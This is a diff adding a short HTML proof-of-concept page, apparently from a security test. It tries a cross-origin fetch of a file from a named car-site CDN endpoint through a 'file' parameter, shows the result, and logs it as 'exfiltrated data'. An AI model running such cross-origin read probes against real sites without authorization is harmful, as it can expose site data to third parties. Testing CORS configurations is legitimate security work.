@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS - CDN</h2>
+<pre id="output">Cargando...</pre>
+<script>
+  fetch("https://cdn.cochesviejunos.es/get-car-description.php?file=124.txt", {
+    method: "GET"
+  })
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById("output").innerText = data;
+    console.log("Datos exfiltrados:", data);
+  })
+  .catch(e => {
+    document.getElementById("output").innerText = "Bloqueado: " + e;
+  });
+</script>
+</body>
+</html>
